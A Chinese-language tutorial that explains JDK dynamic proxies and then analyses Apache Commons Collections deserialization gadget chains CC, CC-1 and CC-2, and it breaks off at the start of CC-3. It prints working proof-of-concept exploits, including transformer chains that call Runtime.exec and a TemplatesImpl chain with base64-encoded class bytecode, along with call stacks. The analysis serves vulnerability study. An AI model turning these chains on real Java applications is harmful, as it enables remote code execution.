# JDK动态代理

作用：在不修改原码的基础上扩展和增强实现；对不能直接访问的类实现间接访问；

  * Proxy： **代理类** ，每一个代理类都会绑定一个InvocationHandler（调用处理器）的实现类

  * InvocationHandler： **调用处理器** 或者叫做 **调用处理程序** ，实现InvocationHandler的invoke方法。

  * 被增强类： **目标类**

示例代码：

    
    
    //目标接口  
    public interface TargetInterface {  
    public void method();  
    }  
    //目标类  
    public class Target implements TargetInterface {  
    @Override  
    public void method() {  
    System.out.println("Target running....");  
    }  
    }  
    // 代理实现  
    public class ProxyDemo{  
    public void test1(){  
    Target target = new Target(); //创建目标对象  
    //创建代理对象  
    TargetInterface proxy =   
    (TargetInterface)Proxy.newProxyInstance(  
    target.getClass().getClassLoader(),  
    target.getClass().getInterfaces(),  
    new InvocationHandler() {  
    @Override  
    public Object invoke(Object proxy,   
    Method method,   
    Object[] args) throws Throwable {  
    System.out.println("前置增强代码...");  
    Object invoke = method.invoke(target, args);  
    System.out.println("后置增强代码...");  
    return invoke;  
    }   
    );   
    target.method();  
    }  
    }

## 1、过程分析

`Proxy.newProxyInstance`方法是JDK动态代理的核心方法，它接收目标类的类加载器、接口和调用处理器InvocationHandler，
**返回代理对象** 。

    
    
    @CallerSensitive  
    public static Object newProxyInstance(ClassLoader loader,  
    Class<?>[] interfaces,  
    InvocationHandler h) {  
    ....  
    // 获取代理.class对象  
    Class<?> cl = getProxyClass0(loader, intfs);  
    try {  
    // 获取代理类Proxy的构造器  
    final Constructor<?> cons = cl.getConstructor(constructorParams);  
    // 传入的调用处理器（可以是自定义处理器或已经写好的处理器）  
    final InvocationHandler ih = h;  
    if (sm != null && ProxyAccessHelper.needsNewInstanceCheck(cl)) {  
    // 使用doPrivilege创建代理实例，就像代理类一样实现需要特殊权限的非公共接口。  
    return AccessController.doPrivileged(new PrivilegedAction<Object>() {  
    public Object run() {  
    return newInstance(cons, ih);  
    }  
    });  
    } else {  
    // 实例化代理类  
    return newInstance(cons, ih);  
    }  
    ....  
    }

（1）`Class<?> cl = getProxyClass0(loader, intfs)`：获取到代理实例的 **class对象**
，程序最终会调用本地方法`native Class defineClass0`（由jvm实现其同名方法），具体调用栈如下：

    
    
    defineClass0:829, Proxy(java.lang.reflect)  
    apply:675, Proxy$ProxyClassFactory (java.lang.reflect)  
    apply:592, Proxy$ProxyClassFactory (java.lang.reflect)  
    get:244, WeakCache$Factory (java.lang.reflect)  
    get:141, WeakCache (java.lang.reflect)  
    getProxyClass0:455, Proxy (java.lang.reflect)  
    newProxyInstance:738, Proxy (java.lang.reflect)  
    main:40, Cc1 (comcollections)

（2）`return newInstance(cons, ih)`：接收cons（代理类的构造方法）和ih（调用控制器） **返回代理对象**
，具体调用栈如下：

    
    
    // cons.newInstance(new Object[] {h} )  
    newInstance:510, Constructor (java.lang.reflect)  
    newInstance:764, Proxy (java.lang.reflect)  
    newProxyInstance:755, Proxy (java.lang.reflect)  
    main:40, Cc1 (comcollections)

## 1、代理类

  * 生成代理对象class文件的方法。

    
    
    /**  
    * @param className  设置的代理类名字  
    * @param interfaces 被代理类接口  
    * @throws IOException  
    */  
    public static void saveProxyObject(String className,   
    Class[] interfaces, String path) throws IOException {  
    // 代理类的字节数组  
    byte[] classFile = ProxyGenerator.generateProxyClass(  
    className,   
    interfaces.getClass().getInterfaces()  
    );  
    FileOutputStream out = new FileOutputStream(path);  
    out.write(classFile);  
    out.flush();  
    }

  * 代理对象反编译代码

JDK动态代理只能代理接口是因为Java遵循单继承多实现，而代理类已经继承了Proxy，所以仅能实现接口。

    
    
    ​  
    package comcollections;  
    ​  
    import java.io.Serializable;  
    import java.lang.reflect.InvocationHandler;  
    import java.lang.reflect.Method;  
    import java.lang.reflect.Proxy;  
    import java.lang.reflect.UndeclaredThrowableException;  
    import java.util.Collection;  
    import java.util.Map;  
    import java.util.Set;  
    ​  
    public final class $Proxy0 extends Proxy implements Map, Serializable {  
    private static Method m13;  
    ​  
    private static Method m14;  
    ​  
    private static Method m9;  
    ​  
    private static Method m2;  
    ​  
    private static Method m1;  
    ​  
    private static Method m5;  
    ​  
    private static Method m7;  
    ​  
    private static Method m3;  
    ​  
    private static Method m12;  
    ​  
    private static Method m8;  
    ​  
    private static Method m0;  
    ​  
    private static Method m6;  
    ​  
    private static Method m10;  
    ​  
    private static Method m11;  
    ​  
    private static Method m4;  
    ​  
    public $Proxy0(InvocationHandler paramInvocationHandler) {  
    super(paramInvocationHandler);  
    }  
    ​  
    public final boolean containsKey(Object paramObject) {  
    try {  
    return ((Boolean)this.h.invoke(this, m13, new Object[] { paramObject })).booleanValue();  
    } catch (Error|RuntimeException error) {  
    throw null;  
    } catch (Throwable throwable) {  
    throw new UndeclaredThrowableException(throwable);  
    }  
    }  
    ​  
    public final boolean containsValue(Object paramObject) {  
    try {  
    return ((Boolean)this.h.invoke(this, m14, new Object[] { paramObject })).booleanValue();  
    } catch (Error|RuntimeException error) {  
    throw null;  
    } catch (Throwable throwable) {  
    throw new UndeclaredThrowableException(throwable);  
    }  
    }  
    ​  
    public final int size() {  
    try {  
    return ((Integer)this.h.invoke(this, m9, null)).intValue();  
    } catch (Error|RuntimeException error) {  
    throw null;  
    } catch (Throwable throwable) {  
    throw new UndeclaredThrowableException(throwable);  
    }  
    }  
    ​  
    public final String toString() {  
    try {  
    return (String)this.h.invoke(this, m2, null);  
    } catch (Error|RuntimeException error) {  
    throw null;  
    } catch (Throwable throwable) {  
    throw new UndeclaredThrowableException(throwable);  
    }  
    }  
    ​  
    public final boolean equals(Object paramObject) {  
    try {  
    return ((Boolean)this.h.invoke(this, m1, new Object[] { paramObject })).booleanValue();  
    } catch (Error|RuntimeException error) {  
    throw null;  
    } catch (Throwable throwable) {  
    throw new UndeclaredThrowableException(throwable);  
    }  
    }  
    ​  
    public final Object put(Object paramObject1, Object paramObject2) {  
    try {  
    return this.h.invoke(this, m5, new Object[] { paramObject1, paramObject2 });  
    } catch (Error|RuntimeException error) {  
    throw null;  
    } catch (Throwable throwable) {  
    throw new UndeclaredThrowableException(throwable);  
    }  
    }  
    ​  
    public final void clear() {  
    try {  
    this.h.invoke(this, m7, null);  
    return;  
    } catch (Error|RuntimeException error) {  
    throw null;  
    } catch (Throwable throwable) {  
    throw new UndeclaredThrowableException(throwable);  
    }  
    }  
    ​  
    public final Object remove(Object paramObject) {  
    try {  
    return this.h.invoke(this, m3, new Object[] { paramObject });  
    } catch (Error|RuntimeException error) {  
    throw null;  
    } catch (Throwable throwable) {  
    throw new UndeclaredThrowableException(throwable);  
    }  
    }  
    ​  
    public final Set keySet() {  
    try {  
    return (Set)this.h.invoke(this, m12, null);  
    } catch (Error|RuntimeException error) {  
    throw null;  
    } catch (Throwable throwable) {  
    throw new UndeclaredThrowableException(throwable);  
    }  
    }  
    ​  
    public final boolean isEmpty() {  
    try {  
    return ((Boolean)this.h.invoke(this, m8, null)).booleanValue();  
    } catch (Error|RuntimeException error) {  
    throw null;  
    } catch (Throwable throwable) {  
    throw new UndeclaredThrowableException(throwable);  
    }  
    }  
    ​  
    public final int hashCode() {  
    try {  
    return ((Integer)this.h.invoke(this, m0, null)).intValue();  
    } catch (Error|RuntimeException error) {  
    throw null;  
    } catch (Throwable throwable) {  
    throw new UndeclaredThrowableException(throwable);  
    }  
    }  
    ​  
    public final Collection values() {  
    try {  
    return (Collection)this.h.invoke(this, m6, null);  
    } catch (Error|RuntimeException error) {  
    throw null;  
    } catch (Throwable throwable) {  
    throw new UndeclaredThrowableException(throwable);  
    }  
    }  
    ​  
    public final Set entrySet() {  
    try {  
    return (Set)this.h.invoke(this, m10, null);  
    } catch (Error|RuntimeException error) {  
    throw null;  
    } catch (Throwable throwable) {  
    throw new UndeclaredThrowableException(throwable);  
    }  
    }  
    ​  
    public final void putAll(Map paramMap) {  
    try {  
    this.h.invoke(this, m11, new Object[] { paramMap });  
    return;  
    } catch (Error|RuntimeException error) {  
    throw null;  
    } catch (Throwable throwable) {  
    throw new UndeclaredThrowableException(throwable);  
    }  
    }  
    ​  
    public final Object get(Object paramObject) {  
    try {  
    return this.h.invoke(this, m4, new Object[] { paramObject });  
    } catch (Error|RuntimeException error) {  
    throw null;  
    } catch (Throwable throwable) {  
    throw new UndeclaredThrowableException(throwable);  
    }  
    }  
    ​  
    static {  
    try {  
    m13 = Class.forName("java.util.Map").getMethod("containsKey", new Class[] { Class.forName("java.lang.Object") });  
    m14 = Class.forName("java.util.Map").getMethod("containsValue", new Class[] { Class.forName("java.lang.Object") });  
    m9 = Class.forName("java.util.Map").getMethod("size", new Class[0]);  
    m2 = Class.forName("java.lang.Object").getMethod("toString", new Class[0]);  
    m1 = Class.forName("java.lang.Object").getMethod("equals", new Class[] { Class.forName("java.lang.Object") });  
    m5 = Class.forName("java.util.Map").getMethod("put", new Class[] { Class.forName("java.lang.Object"), Class.forName("java.lang.Object") });  
    m7 = Class.forName("java.util.Map").getMethod("clear", new Class[0]);  
    m3 = Class.forName("java.util.Map").getMethod("remove", new Class[] { Class.forName("java.lang.Object") });  
    m12 = Class.forName("java.util.Map").getMethod("keySet", new Class[0]);  
    m8 = Class.forName("java.util.Map").getMethod("isEmpty", new Class[0]);  
    m0 = Class.forName("java.lang.Object").getMethod("hashCode", new Class[0]);  
    m6 = Class.forName("java.util.Map").getMethod("values", new Class[0]);  
    m10 = Class.forName("java.util.Map").getMethod("entrySet", new Class[0]);  
    m11 = Class.forName("java.util.Map").getMethod("putAll", new Class[] { Class.forName("java.util.Map") });  
    m4 = Class.forName("java.util.Map").getMethod("get", new Class[] { Class.forName("java.lang.Object") });  
    ​  
    } catch (NoSuchMethodException noSuchMethodException) {  
    throw new NoSuchMethodError(noSuchMethodException.getMessage());  
    } catch (ClassNotFoundException classNotFoundException) {  
    throw new NoClassDefFoundError(classNotFoundException.getMessage());  
    }  
    }  
    }  
    ​

# CC

## 1、Poc

    
    
    public class Poc {  
    public static void main(String[] args) throws Exception {  
    // 命令链  
    Transformer[] transformers = new Transformer[]{  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod",   
    new Class[] {String.class, Class[].class },   
    new Object[] {"getRuntime", new Class[0] }),  
    new InvokerTransformer("invoke",   
    new Class[] {Object.class, Object[].class },   
    new Object[] {null, new Object[0] }),  
    new InvokerTransformer("exec",   
    new Class[] {String.class },   
    new Object[] {"calc.exe"})  
    };  
    Transformer transformerChain = new ChainedTransformer(transformers);  
    Map map = new HashMap();  
    Map transformedMap = TransformedMap.decorate(map, null, transformerChain);  
    // 漏洞触发在这个位置  
    transformedMap.put(null,"test");  
    }  
    }

## 2、流程图

![Java CC反序列化漏洞-导出](https://image.3001.net/images/20230506/1683341783_6455c1d7913871b4f7f4c.png!small)

## 3、TransformedMap.put（）

    
    
    public Object put(Object key, Object value) {  
    // 形参key=null，返回值也为null  
    key = transformKey(key);  
    value = transformValue(value);  
    // 漏洞触发在这个位置触发  
    return getMap().put(key, value);  
    }

## 4、TransformedMap.transformValue（）

Poc中调用了decorate（）方法，该方法会初始化valueTransformer成员常量。

    
    
    protected Object transformValue(Object object) {  
    if (valueTransformer == null) {  
    return object;  
    }  
    return valueTransformer.transform(object);  
    }

## 5、ChainedTransformer.transform（）

CC中实现接口Transformer的类，都需要实现transform（）方法。

iTransformers数组的第一个元素为ConstantTransformer类型，这个类型也实现了Transformer接口，其transform方法是返回构造方法的参数。

  * 第一轮循环：object = Runtime.class

iTransformers数组的其他元素为InvokerTransformer类型，因此下面三轮的程序流会进入【6】。

  * 第二轮循环：`object = Runtime.class.getMethod("getRuntime", null)`

  * 第三轮循环：`object = Runtime.class.getMethod("getRuntime", null).invoke(null, null)`

  * 第四轮循环：`Runtime.class.getMethod("getRuntime", null).invoke(null, null).exec("cacl.exe")`

    
    
    // Transformer transformerChain = new ChainedTransformer(transformers);  
    // 链转换器的有参构造方法初始化了iTransformers，值为transformers（构造的数组）  
    public Object transform(Object object) {  
    for (int i = 0; i < iTransformers.length; i++) {  
    object = iTransformers[i].transform(object);  
    }  
    return object;  
    }

## 6、InvokerTransformer.transform（）

根据input.class对象cls和该实例初始化时得到的参数iMethodName、iParamTypes、iArgs，调用invoke()以执行受控制的方法。

    
    
    public Object transform(Object input) {  
    if (input == null) {  
    return null;  
    }  
    try {  
    Class cls = input.getClass();  
    // iMethodName,方法名字  
    // iParamTypes，方法的参数类型  
    // 这两个值都是通过InvokerTransformer的有参构造初始化的（Poc中构造数组时调用）。  
    Method method = cls.getMethod(iMethodName, iParamTypes);  
    return method.invoke(input, iArgs);  
      
    } catch (NoSuchMethodException ex) {  
    throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");  
    } catch (IllegalAccessException ex) {  
    throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");  
    } catch (InvocationTargetException ex) {  
    throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);  
    }  
    }

利用链：TransformedMap——>ChainedTransformer——>InvokerTransformer

CC Poc仅做CommonsCollections漏洞点的演示之用，想要真正利用还需具备一些其他条件。

要求一：利用链对象能进入到应用并获得执行权限。

要求二：应用使用了CommonsCollections 包。

Java应用通常采用序列化技术持久化对象，而且支持重写序列化操作，因此序列化技术的存在直接满足了要求一。所以在挖掘完整利用链时，就需要寻找重写了readObject方法的类，同时重写的readObject方法能与利用链衔接到一起。

# CC-1

## 1、测试环境

  * CommonsCollections：3.1-3.2.1

  * JDK版本小于u71

## 2、Poc

    
    
    public class Cc1 {  
    ​  
    public static void main(String[] args) throws Exception {  
    // 命令链  
    Transformer[] transformers = new Transformer[]{  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod",   
    new Class[]{String.class, Class[].class},   
    new Object[]{"getRuntime", new Class[0]}),  
    new InvokerTransformer("invoke",   
    new Class[]{Object.class, Object[].class},   
    new Object[]{null, new Object[0]}),  
    new InvokerTransformer("exec",   
    new Class[]{String.class},   
    new Object[]{"calc"})  
    };  
    Transformer chainedTransformer = new ChainedTransformer(transformers);  
    // 目标对象  
    Map uselessMap = new HashMap();  
    Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);  
    ​  
    // 构造调用处理器,自定义或者使用已存在的调用处理器。  
    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
    Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);  
    /* 将此对象的可访问标志设置为指定的布尔值。  
    * true值表示反射对象在使用时应该抑制Java语言访问检查。  
    * 值为false表示反射的对象应该强制执行Java语言访问检查。  
    * */  
    constructor.setAccessible(true);  
    InvocationHandler handler = (InvocationHandler) constructor.newInstance(  
    Override.class,   
    lazyMap  
    );  
    ​  
    // 代理对象  
    Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),   
    LazyMap.class.getInterfaces(),   
    handler);  
    ​  
    // 实现利用链触发  
    InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(  
    Override.class,   
    mapProxy  
    );  
    ​  
    // 序列化利用链  
    ByteArrayOutputStream baos = new ByteArrayOutputStream();  
    ObjectOutputStream oos = new ObjectOutputStream(baos);  
    oos.writeObject(handler1);  
    oos.flush();  
    oos.close();  
      
    // 反序列化测试  
    ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());  
    ObjectInputStream ois = new ObjectInputStream(bais);  
    ois.readObject();  
    ois.close();  
    }  
    }  
    ​

## 3、分析

  * 调用栈

    
    
    transform:124, InvokerTransformer (org.apache.commons.collections.functors)  
    transform:123, ChainedTransformer (org.apache.commons.collections.functors)  
    get:158, LazyMap (org.apache.commons.collections.map)  
    invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)  
    // 调用代理对象父类Proxy成员属性调用处理器h，执行对象h的invoke方法  
    entrySet:-1, $Proxy0 (com.sun.proxy)  
    // 执行handler1自定义的反序列化方法，调用代理对象的entrySet()方法  
    readObject:349, AnnotationInvocationHandler (sun.reflect.annotation)  
    // 调用AnnotationInvocationHandler类自定义的反序列化方法  
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)  
    invoke:57, NativeMethodAccessorImpl (sun.reflect)  
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)  
    invoke:606, Method (java.lang.reflect)  
    invokeReadObject:1017, ObjectStreamClass (java.io)  
    readSerialData:1893, ObjectInputStream (java.io)  
    readOrdinaryObject:1798, ObjectInputStream (java.io)  
    readObject0:1350, ObjectInputStream (java.io)  
    readObject:370, ObjectInputStream (java.io)  
    main:57, Cc1 (org.example)  
    // 执行JDK的反序列化过程

利用链：AnnotationInvocationHandler——>$Proxy0——>AnnotationInvocationHandler——>LazyMap——>ChainedTransformer——>InvokerTransformer

  * handler1结构

`main:57, Cc1 (org.example)`——>

`InvocationHandler handler1 = (InvocationHandler)
constructor.newInstance(Override.class, mapProxy )`

![image-20230417110658425](https://image.3001.net/images/20230506/1683341814_6455c1f6befe4ea407535.png!small)

上述POC中之所以实例化第二个调用处理器handler1，是为了利用其重写的readObject方法得到程序执行权限。

当执行handler1反序列化方法内的`this.memberValues.entrySet().iterator()`语句，因为`this.memberValues`是handler1对象声明时传入的代理对象mapProxy，所以会调用代理对象的entrySet方法。

到了代理对象内部，所有方法实质都是调用其父类Proxy的成员属性调用处理器h，并执行h的invoke方法。而在h的invoke方法中，`this.memberValues.get(var4)`（`this.memberValues`为ChainedTransformer对象）语句又会对Map进行取值操作，进而执行
**LazyMap.get** 方法。程序运行到这里，便与`ChainedTransformer`利用链衔接到了一起触发了反序列化漏洞。

# CC-2

## 1、测试环境

  * CommonsCollections4： 4.0

CommonsCollections 3 无法使用，因为TransformingComparator
无法序列化。其次只有CommonsCollections4 4.0可以使用，以为4的其他版本去掉了 InvokerTransformer 的
Serializable 继承。

  * JDK 7、8、11

## 2、Poc

    
    
    package org.example;  
    ​  
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
    import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;  
    import org.apache.commons.collections4.comparators.TransformingComparator;  
    import org.apache.commons.collections4.functors.InvokerTransformer;  
    ​  
    import java.io.ByteArrayInputStream;  
    import java.io.ByteArrayOutputStream;  
    import java.io.ObjectInputStream;  
    import java.io.ObjectOutputStream;  
    import java.lang.reflect.Field;  
    import java.util.PriorityQueue;  
    ​  
    public class Cc2 {  
    ​  
    public static void main(String[] args) {  
    ​  
    try {  
    // 包含命令的对象字节码  
    byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");  
    ​  
    // 元素对象templates，_bytecodes包含转换类和任何辅助类的实际类定义。  
    // 模板实现类  
    TemplatesImpl templates = new TemplatesImpl();  
    setFieldValue(templates, "_bytecodes", new byte[][]{code});  
    setFieldValue(templates, "_name", "HelloTemplatesImpl");  
    setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());  
    ​  
    // comparator比较器对象，invokerTransformer包含获取templates.newTransformer方法的参数  
    InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",  
    new Class[]{},  
    new Object[]{});  
    TransformingComparator comparator = new TransformingComparator(  
    invokerTransformer);  
    ​  
    // priorityQueue优先队列容器。此处需预先向队列中存储两个元素，否则  
    // 存入元素后heapify()方法不会对元素进行重排也就触发不了漏洞.  
    PriorityQueue priorityQueue = new PriorityQueue(2);  
    priorityQueue.add(1);  
    priorityQueue.add(1);  
    ​  
    // 反射设置 Field  
    Object[] objects = new Object[]{templates, templates};  
    setFieldValue(priorityQueue, "queue", objects);  
    setFieldValue(priorityQueue, "comparator", comparator);  
    ​  
    // 序列化利用链  
    ByteArrayOutputStream baos = new ByteArrayOutputStream();  
    ObjectOutputStream oos = new ObjectOutputStream(baos);  
    oos.writeObject(priorityQueue);  
    oos.flush();  
    oos.close();  
    ​  
    // 序列化测试  
    ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());  
    ObjectInputStream ois = new ObjectInputStream(bais);  
    ois.readObject();  
    ois.close();  
    ​  
    } catch (Exception e) {  
    e.printStackTrace();  
    }  
    ​  
    }  
    ​  
    // 反射设置对象成员属性  
    public static void setFieldValue(Object object, String fieldName, Object value) {  
    try {  
    Field field = object.getClass().getDeclaredField(fieldName);  
    field.setAccessible(true);  
    field.set(object, value);  
    } catch (Exception e) {  
    e.printStackTrace();  
    }  
    }  
    }

  * 包含命令的对象字节码反编译类

    
    
    package org.example;  
    ​  
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;  
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  
    ​  
    public class HelloTemplatesImpl extends AbstractTranslet {  
    public HelloTemplatesImpl() {  
    try {  
    Runtime.getRuntime().exec("calc");  
    } catch (Exception var2) {  
    var2.printStackTrace();  
    }  
    ​  
    }  
    // 实现接口方法  
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document,  
    SerializationHandler[] handlers) throws TransletException {  
    ​  
    }  
    // 实现接口方法  
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document,  
    DTMAxisIterator iterator,   
    SerializationHandler handler) throws TransletException {  
      
    }    
    }

## 3、分析

  * 调用栈

    
    
    getTransletInstance:387, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)  
    newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)  
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)  
    invoke:57, NativeMethodAccessorImpl (sun.reflect)  
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)  
    invoke:606, Method (java.lang.reflect)  
    transform:129, InvokerTransformer (org.apache.commons.collections4.functors)  
    compare:81, TransformingComparator (org.apache.commons.collections4.comparators)  
    siftDownUsingComparator:699, PriorityQueue (java.util)  
    siftDown:667, PriorityQueue (java.util)  
    heapify:713, PriorityQueue (java.util)  
    // 元素被保证在“适当的顺序”，但规范从来没有解释这可能是什么。  
    readObject:773, PriorityQueue (java.util)  
    // 执行PriorityQueue类的反序列化过程，  
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)  
    invoke:57, NativeMethodAccessorImpl (sun.reflect)  
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)  
    invoke:606, Method (java.lang.reflect)  
    invokeReadObject:1017, ObjectStreamClass (java.io)  
    readSerialData:1893, ObjectInputStream (java.io)  
    readOrdinaryObject:1798, ObjectInputStream (java.io)  
    readObject0:1350, ObjectInputStream (java.io)  
    readObject:370, ObjectInputStream (java.io)  
    main:51, Cc2 (org.example)  
    // 执行JDK的反序列化过程

利用链：PriorityQueue——>TransformingComparator——>InvokerTransformer——>TemplatesImpl

CC2的利用思路是组装PriortyQueue（优先队列）对象，使之最终调用InvokerTransformer类的transformer方法。

 **PriortyQueue**
需要队列元素保存在适当位置，所以会使用比较器对元素比较定序，而这个比较器和元素都是可控的。所以在上述Poc中，分别构建了比较器对象和元素对象。

①元素对象： **TemplatesImpl** （模板实现类），利用反射将包含命令的对象字节码挂载到其成员属性上。

②比较器对象：声明 **TransformingComparator** 比较器对象。

程序执行到PriortyQueue自定义的`readObject()`方法时，序列化流内的元素对象会被`heapify()`方法重新排序，而排序最重要的就是比较元素，所以在PriortyQueue声明时，就通过反射提前将TransformingComparator比较器挂载到了成员属性comparator上。

比较器对象的比较方法compare在真正比较之前，会执行比较器声明时传入的`InvokerTransformer`对象的`transform`方法，对元素进行转换。也就是在这里，transform方法会被精心构造的成员属性控制，执行（invoke）TemplatesImpl类newTransformer方法，最终在`getTransletInstance:387,
TemplatesImpl`处触发漏洞。

    
    
    private Translet getTransletInstance() throws TransformerConfigurationException {  
    try {  
    if (_name == null) return null;  
    // defineTransletClasses：返回_bytecodes设置到_class数组中  
    if (_class == null) defineTransletClasses();  
    // HelloTemplatesImpl被实例化，触发静态代码块中命令  
    AbstractTranslet translet =   
    (AbstractTranslet) _class[_transletIndex].newInstance();  
    ......  
    }

# CC-3

## 1、测试环境

  * CommonsCollections：3.1-3.2.1

  * JDk小于等于7u21

## 2、Poc

    
    
    package org.example;  
    ​  
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
    import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;  
    import org.apache.commons.collections.Transformer;  
    import org.apache.commons.collections.functors.ChainedTransformer;  
    import org.apache.commons.collections.functors.ConstantTransformer;  
    import org.apache.commons.collections.functors.InstantiateTransformer;  
    import org.apache.commons.collections.map.LazyMap;  
    ​  
    import javax.xml.transform.Templates;  
    import java.io.ByteArrayInputStream;  
    import java.io.ByteArrayOutputStream;  
    import java.io.ObjectInputStream;  
    import java.io.ObjectOutputStream;  
    import java.lang.reflect.Constructor;  
    import java.lang.reflect.Field;  
    import java.lang.reflect.InvocationHandler;  
    import java.lang.reflect.Proxy;  
    import java.util.HashMap;  
    import java.util.Map;  
    ​  
    public class Cc3 {  
    ​  
    public static void main(String[] args) {  
    ​  
    try {  
    // 包含命令的对象字节码  
